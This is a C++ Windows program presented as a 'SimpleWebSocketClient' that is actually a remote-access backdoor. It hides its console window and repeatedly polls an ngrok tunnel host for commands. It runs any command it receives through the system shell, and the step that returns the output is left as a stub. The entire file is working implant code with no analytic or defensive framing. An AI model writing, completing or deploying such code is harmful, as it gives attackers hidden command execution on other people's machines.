#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <cstdlib>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

class SimpleWebSocketClient {
private:
    std::string server_host;
    int server_port;
    
public:
    SimpleWebSocketClient(const std::string& host, int port) 
        : server_host(host), server_port(port) {}
    
    std::string executeCommand(const std::string& cmd) {
        std::string result;
        char buffer[128];
        
        FILE* pipe = _popen(cmd.c_str(), "r");
        if (!pipe) return "Error: Could not execute command";
        
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
        _pclose(pipe);
        
        return result.empty() ? "Command executed (no output)" : result;
    }
    
    void connectAndRun() {
        // Hide console window
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        
        while (true) {
            try {
                // Simplified HTTP polling approach for small size
                HINTERNET hInternet = InternetOpen(L"MicroClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
                if (!hInternet) {
                    std::this_thread::sleep_for(std::chrono::seconds(5));
                    continue;
                }
                
                std::wstring host = std::wstring(server_host.begin(), server_host.end());
                HINTERNET hConnect = InternetConnect(hInternet, host.c_str(), server_port, 
                                                   NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
                
                if (hConnect) {
                    // Poll for commands every 2 seconds
                    while (true) {
                        HINTERNET hRequest = HttpOpenRequest(hConnect, L"GET", L"/api/command", 
                                                           NULL, NULL, NULL, 0, 0);
                        if (hRequest) {
                            if (HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
                                char buffer[1024];
                                DWORD bytesRead;
                                if (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead)) {
                                    if (bytesRead > 0) {
                                        std::string command(buffer, bytesRead);
                                        if (command.find("cmd:") == 0) {
                                            std::string cmd = command.substr(4);
                                            std::string output = executeCommand(cmd);
                                            
                                            // Send result back (simplified)
                                            std::string response = "[" + cmd + "]\n" + output;
                                            // Would need to implement POST request here
                                        }
                                    }
                                }
                            }
                            InternetCloseHandle(hRequest);
                        }
                        std::this_thread::sleep_for(std::chrono::seconds(2));
                    }
                }
                
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                
            } catch (...) {
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        }
    }
};

int main() {
    SimpleWebSocketClient client("0.tcp.ngrok.io", 12354);
    client.connectAndRun();
    return 0;
}